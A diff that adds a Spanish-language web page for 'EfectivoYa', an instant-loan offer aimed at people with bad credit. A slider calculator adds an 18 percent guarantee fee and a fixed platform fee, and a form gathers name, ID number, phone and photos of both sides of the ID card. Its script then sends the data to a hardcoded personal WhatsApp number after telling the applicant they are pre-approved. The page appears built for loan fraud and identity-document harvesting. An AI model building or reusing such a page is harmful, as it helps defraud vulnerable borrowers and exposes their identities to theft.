@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EfectivoYa - Créditos Rápidos al Instante</title>
+    <style>
+        /* --- ESTILOS DE LA CALCULADORA --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #f4f7f6;
+            color: #333;
+            padding-bottom: 30px;
+        }
+        header {
+            background-color: #ffffff;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1e293b;
+        }
+        .logo span {
+            color: #10b981;
+        }
+        .container {
+            max-width: 500px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+        .welcome-text {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .welcome-text h1 {
+            font-size: 22px;
+            color: #1e293b;
+            margin-bottom: 8px;
+        }
+        .welcome-text p {
+            font-size: 14px;
+            color: #64748b;
+        }
+        .calculator-box, .form-box {
+            background-color: #ffffff;
+            border-radius: 16px;
+            padding: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            margin-bottom: 20px;
+        }
+        .calculator-box h2, .form-box h2 {
+            font-size: 18px;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #1e293b;
+        }
+        .control-group {
+            margin-bottom: 25px;
+        }
+        label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #475569;
+            display: block;
+            margin-bottom: 8px;
+        }
+        .amount-display, .days-display {
+            font-size: 28px;
+            font-weight: bold;
+            color: #10b981;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        input[type="range"] {
+            width: 100%;
+            height: 8px;
+            border-radius: 5px;
+            background: #e2e8f0;
+            outline: none;
+            -webkit-appearance: none;
+        }
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #10b981;
+            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+        .range-limits {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #94a3b8;
+            margin-top: 5px;
+        }
+        .summary {
+            background-color: #f8fafc;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            color: #64748b;
+            margin-bottom: 8px;
+        }
+        hr {
+            border: 0;
+            border-top: 1px solid #e2e8f0;
+            margin: 10px 0;
+        }
+        .summary-item.total {
+            font-size: 18px;
+            font-weight: bold;
+            color: #1e293b;
+        }
+        .summary-item.total #total-cost {
+            color: #10b981;
+        }
+        
+        /* --- ESTILOS DEL FORMULARIO --- */
+        .form-box {
+            display: none;
+            animation: slideDown 0.4s ease-out;
+        }
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            font-size: 15px;
+            background-color: #f8fafc;
+            outline: none;
+            transition: border 0.2s;
+            margin-bottom: 15px;
+        }
+        .input-field:focus {
+            border-color: #10b981;
+            background-color: #fff;
+        }
+        .file-label {
+            display: block;
+            text-align: center;
+            padding: 12px;
+            background-color: #f1f5f9;
+            border: 2px dashed #cbd5e1;
+            border-radius: 8px;
+            cursor: pointer;
+            color: #64748b;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }
+        .file-label:active {
+            background-color: #e2e8f0;
+        }
+        .file-label input {
+            display: none;
+        }
+
+        /* Botones */
+        .btn-apply, .btn-submit {
+            width: 100%;
+            background-color: #10b981;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(16, 185, 129, 0.2);
+        }
+        .btn-apply:active, .btn-submit:active {
+            background-color: #059669;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">Efectivo<span>Ya</span></div>
+    </header>
+
+    <main class="container">
+        <section class="welcome-text">
+            <h1>Créditos al instante para Reportados</h1>
+            <p>Dinero rápido, 100% digital y aprobado en minutos.</p>
+        </section>
+
+        <section class="calculator-box" id="calc-section">
+            <h2>Calcula tu Crédito</h2>
+            
+            <div class="control-group">
+                <label for="amount">¿Cuánto dinero necesitas?</label>
+                <div class="amount-display">$ <span id="amount-val">150.000</span></div>
+                <input type="range" id="amount" min="50000" max="500000" step="10000" value="150000">
+                <div class="range-limits">
+                    <span>$50.000</span>
+                    <span>$500.000</span>
+                </div>
+            </div>
+
+            <div class="control-group">
+                <label for="days">¿A cuántos días lo vas a pagar?</label>
+                <div class="days-display"><span id="days-val">15</span> días</div>
+                <input type="range" id="days" min="5" max="30" step="1" value="15">
+                <div class="range-limits">
+                    <span>5 días</span>
+                    <span>30 días</span>
+                </div>
+            </div>
+
+            <div class="summary">
+                <div class="summary-item">
+                    <span>Intereses corrientes:</span>
+                    <span id="interest-cost">$0</span>
+                </div>
+                <div class="summary-item">
+                    <span>Cargo por Aval (Garantía):</span>
+                    <span id="aval-cost">$0</span>
+                </div>
+                <div class="summary-item">
+                    <span>Firma Electrónica y Plataforma:</span>
+                    <span id="platform-cost">$45.000</span>
+                </div>
+                <hr>
+                <div class="summary-item total">
+                    <span>Total a pagar:</span>
+                    <span id="total-cost">$0</span>
+                </div>
+            </div>
+
+            <button class="btn-apply" onclick="showForm()">
+                Solicitar Crédito Ahora
+            </button>
+        </section>
+
+        <section class="form-box" id="form-section">
+            <h2>Verificación de Identidad</h2>
+            <form id="loan-form" onsubmit="sendData(event)">
+                
+                <label>Nombre Completo (Como aparece en la cédula)</label>
+                <input type="text" id="user-name" class="input-field" placeholder="Ej. Juan Pérez" required>
+
+                <label>Número de Cédula</label>
+                <input type="number" id="user-id" class="input-field" placeholder="Ej. 1094000000" required>
+
+                <label>Número de Celular (Nequi o Daviplata)</label>
+                <input type="number" id="user-phone" class="input-field" placeholder="Ej. 3148934475" required>
+
+                <label>Foto de la Cédula (FRENTE)</label>
+                <label class="file-label">
+                    <span id="file-front-text">📸 Tomar foto de Cédula (FRENTE)</span>
+                    <input type="file" id="user-file-front" accept="image/*" capture="environment" onchange="updateFrontText()" required>
+                </label>
+
+                <label>Foto de la Cédula (RESPALDO)</label>
+                <label class="file-label">
+                    <span id="file-back-text">📸 Tomar foto de Cédula (RESPALDO)</span>
+                    <input type="file" id="user-file-back" accept="image/*" capture="environment" onchange="updateBackText()" required>
+                </label>
+
+                <button type="submit" class="btn-submit">
+                    Verificar y Enviar Solicitud
+                </button>
+            </form>
+        </section>
+    </main>
+
+    <script>
+        const amountInput = document.getElementById('amount');
+        const daysInput = document.getElementById('days');
+        const amountVal = document.getElementById('amount-val');
+        const daysVal = document.getElementById('days-val');
+        
+        const interestCost = document.getElementById('interest-cost');
+        const avalCost = document.getElementById('aval-cost');
+        const platformCost = document.getElementById('platform-cost');
+        const totalCost = document.getElementById('total-cost');
+
+        function calculateLoan() {
+            const amount = parseInt(amountInput.value);
+            const days = parseInt(daysInput.value);
+
+            amountVal.innerText = amount.toLocaleString('es-CO');
+            daysVal.innerText = days;
+
+            const interest = Math.round(amount * (0.00083 * days)); 
+            const avalFee = Math.round(amount * 0.18);
+            const platformFee = 45000; 
+            const total = amount + interest + avalFee + platformFee;
+
+            interestCost.innerText = "$ " + interest.toLocaleString('es-CO');
+            avalCost.innerText = "$ " + avalFee.toLocaleString('es-CO');
+            platformCost.innerText = "$ " + platformFee.toLocaleString('es-CO');
+            totalCost.innerText = "$ " + total.toLocaleString('es-CO');
+        }
+
+        function showForm() {
+            const formSection = document.getElementById('form-section');
+            formSection.style.display = 'block';
+            formSection.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function updateFrontText() {
+            const fileInput = document.getElementById('user-file-front');
+            const fileText = document.getElementById('file-front-text');
+            if(fileInput.files.length > 0) {
+                fileText.innerText = "✓ Frente capturado con éxito";
+                fileText.style.color = "#10b981";
+            }
+        }
+
+        function updateBackText() {
+            const fileInput = document.getElementById('user-file-back');
+            const fileText = document.getElementById('file-back-text');
+            if(fileInput.files.length > 0) {
+                fileText.innerText = "✓ Respaldo capturado con éxito";
+                fileText.style.color = "#10b981";
+            }
+        }
+
+        function sendData(event) {
+            event.preventDefault(); 
+
+            const tuTelefono = "573148934475"; 
+
+            const name = document.getElementById('user-name').value;
+            const idNumber = document.getElementById('user-id').value;
+            const phone = document.getElementById('user-phone').value;
+            const amount = parseInt(amountInput.value).toLocaleString('es-CO');
+            const days = daysInput.value;
+            const total = totalCost.innerText;
+
+            const mensaje = `*NUEVA SOLICITUD DE CRÉDITO - EFECTIVOYA*%0A%0A` +
+                            `👤 *Cliente:* ${name}%0A` +
+                            `🪪 *Cédula:* ${idNumber}%0A` +
+                            `📱 *Celular/Nequi:* ${phone}%0A%0A` +
+                            `💰 *Monto Solicitado:* $ ${amount}%0A` +
+                            `📅 *Plazo:* ${days} días%0A` +
+                            `💵 *Total a pagar:* ${total}%0A%0A` +
+                            `👉 _El cliente adjuntará las fotos de su cédula (frente y respaldo) a continuación._`;
+
+            const urlWhatsApp = `https://wa.me/${tuTelefono}?text=${mensaje}`;
+
+            alert('¡Perfecto ' + name + '! Tu perfil está pre-aprobado. Ahora te redirigiremos a tu WhatsApp para enviar las fotos de tu cédula y finalizar el desembolso.');
+            
+            window.location.href = urlWhatsApp;
+        }
+
+        amountInput.addEventListener('input', calculateLoan);
+        daysInput.addEventListener('input', calculateLoan);
+        calculateLoan();
+    </script>
+
+</body>
+</html>
